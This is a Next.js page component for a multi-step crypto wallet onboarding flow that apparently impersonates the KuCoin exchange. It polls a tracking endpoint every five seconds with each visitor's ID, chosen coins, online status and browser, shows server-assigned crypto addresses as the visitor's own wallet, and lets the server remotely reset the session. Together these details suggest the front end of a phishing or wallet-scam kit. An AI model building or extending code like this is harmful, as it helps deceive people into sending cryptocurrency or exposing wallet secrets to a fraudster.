"use client"

import { useState, useEffect, useCallback } from "react"
import AccessCodeStep from "../components/access-code-step"
import CryptoSelectionStep from "../components/crypto-selection-step"
import LoadingStep from "../components/loading-step"
import WalletSummaryStep from "../components/seed-phrase-step"
import WalletDashboard from "../components/wallet-dashboard"
import { v4 as uuidv4 } from "uuid"
import { Loader2 } from "lucide-react"

export type WalletStep = "access-code" | "crypto-selection" | "loading" | "summary" | "wallet-dashboard"

export default function Page() {
  const [currentStep, setCurrentStep] = useState<WalletStep | null>(null)
  const [selectedCryptos, setSelectedCryptos] = useState<string[]>(() => {
    if (typeof window !== "undefined") {
      const savedCryptos = localStorage.getItem("kucoin-selected-cryptos")
      return savedCryptos ? JSON.parse(savedCryptos) : []
    }
    return []
  })
  const [accessCode, setAccessCode] = useState("")
  const [visitorId, setVisitorId] = useState<string | null>(null)
  const [visitorName, setVisitorName] = useState<string | null>(null)
  const [visitorCryptoAddresses, setVisitorCryptoAddresses] = useState<{ cryptoId: string; address: string }[]>([])
  const [isOnboardingComplete, setIsOnboardingComplete] = useState<boolean>(false)

  useEffect(() => {
    if (typeof window !== "undefined") {
      const savedStep = localStorage.getItem("kucoin-current-step")
      const onboardingComplete = localStorage.getItem("kucoin-onboarding-complete")

      if (onboardingComplete === "true") {
        setCurrentStep("wallet-dashboard")
        setIsOnboardingComplete(true)
      } else {
        setCurrentStep((savedStep as WalletStep) || "access-code")
      }
    }
  }, [])

  const trackVisitorAndCheckReset = useCallback(
    async (isOnlineOverride?: boolean) => {
      let currentVisitorId = localStorage.getItem("kucoin-visitor-id")
      if (!currentVisitorId) {
        currentVisitorId = uuidv4()
        localStorage.setItem("kucoin-visitor-id", currentVisitorId)
      }
      setVisitorId(currentVisitorId)

      const browserInfo = typeof window !== "undefined" ? navigator.userAgent : null

      try {
        const response = await fetch("/api/track-visitor", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            visitorId: currentVisitorId,
            selectedCryptos: selectedCryptos,
            isOnline: isOnlineOverride !== undefined ? isOnlineOverride : true,
            browserInfo: browserInfo,
          }),
        })

        const responseBody = await response.text()

        if (!response.ok) {
          console.error(`Server error (${response.status}) from /api/track-visitor:`, responseBody)
          throw new Error(`Failed to track visitor: ${responseBody}`)
        }

        let data
        try {
          data = JSON.parse(responseBody)
        } catch (jsonParseError) {
          console.error(
            "Failed to parse JSON response from /api/track-visitor:",
            jsonParseError,
            "Raw response:",
            responseBody,
          )
          throw new Error("Invalid JSON response from server.")
        }

        setVisitorName(data.visitorName)
        setVisitorCryptoAddresses(data.cryptoAddresses || [])

        if (data.resetRequested) {
          console.log(`Reset requested for visitor ${currentVisitorId}. Clearing session...`)
          localStorage.removeItem("kucoin-current-step")
          localStorage.removeItem("kucoin-selected-cryptos")
          localStorage.removeItem("kucoin-visitor-id")
          localStorage.removeItem("kucoin-onboarding-complete")
          window.location.reload()
        }
      } catch (error) {
        console.error("Error tracking visitor:", error)
      }
    },
    [selectedCryptos],
  )

  useEffect(() => {
    trackVisitorAndCheckReset()

    const interval = setInterval(trackVisitorAndCheckReset, 5000)
    return () => clearInterval(interval)
  }, [trackVisitorAndCheckReset])

  useEffect(() => {
    const handleVisibilityChange = () => {
      if (document.visibilityState === "hidden") {
        trackVisitorAndCheckReset(false)
      } else {
        trackVisitorAndCheckReset(true)
      }
    }

    document.addEventListener("visibilitychange", handleVisibilityChange)
    handleVisibilityChange()

    return () => {
      document.removeEventListener("visibilitychange", handleVisibilityChange)
    }
  }, [trackVisitorAndCheckReset])

  useEffect(() => {
    localStorage.setItem("kucoin-current-step", currentStep || "")
  }, [currentStep])

  useEffect(() => {
    localStorage.setItem("kucoin-selected-cryptos", JSON.stringify(selectedCryptos))
  }, [selectedCryptos])

  const nextStep = () => {
    if (currentStep === "access-code") {
      setCurrentStep("crypto-selection")
    } else if (currentStep === "crypto-selection") {
      setCurrentStep("loading")
    } else if (currentStep === "loading") {
      setCurrentStep("summary")
    } else if (currentStep === "summary") {
      setCurrentStep("wallet-dashboard")
      localStorage.setItem("kucoin-onboarding-complete", "true")
      setIsOnboardingComplete(true)
    }
  }

  const getStepNumber = () => {
    switch (currentStep) {
      case "access-code":
        return 1
      case "crypto-selection":
        return 2
      case "loading":
        return 2
      case "summary":
        return 3
      case "wallet-dashboard":
        return 4
      default:
        return 1
    }
  }

  return (
    <div>
      {currentStep === null ? (
        <div className="min-h-screen flex items-center justify-center">
          <Loader2 className="h-16 w-16 text-[#24AE8F] animate-spin" />
        </div>
      ) : (
        <>
          {currentStep === "access-code" && (
            <AccessCodeStep onNext={nextStep} onCodeChange={setAccessCode} stepNumber={getStepNumber()} />
          )}
          {currentStep === "crypto-selection" && (
            <CryptoSelectionStep
              onNext={nextStep}
              selectedCryptos={selectedCryptos}
              onSelectionChange={setSelectedCryptos}
              stepNumber={getStepNumber()}
            />
          )}
          {currentStep === "loading" && <LoadingStep onNext={nextStep} stepNumber={getStepNumber()} />}
          {currentStep === "summary" && (
            <WalletSummaryStep onNext={nextStep} stepNumber={getStepNumber()} selectedCryptos={selectedCryptos} />
          )}
          {currentStep === "wallet-dashboard" && (
            <WalletDashboard
              selectedCryptos={selectedCryptos}
              stepNumber={getStepNumber()}
              visitorId={visitorId}
              visitorName={visitorName}
              visitorCryptoAddresses={visitorCryptoAddresses}
            />
          )}
        </>
      )}
    </div>
  )
}
